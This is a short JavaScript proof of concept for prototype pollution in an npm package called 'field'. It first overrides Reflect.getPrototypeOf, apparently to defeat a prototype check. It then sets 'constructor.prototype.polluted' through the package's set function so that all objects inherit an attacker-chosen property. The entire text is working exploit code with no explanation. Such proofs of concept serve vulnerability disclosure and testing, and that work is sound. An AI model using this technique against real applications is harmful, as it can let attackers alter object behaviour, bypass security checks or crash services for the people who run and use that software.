Reflect.getPrototypeOf = () => false;
console.log({}.polluted);
const field = require('field');
const obj = {};
field.set(obj, 'constructor.prototype.polluted', 'yes');
console.log('{ ' + obj.polluted + ', ' + 'yes' + ' }');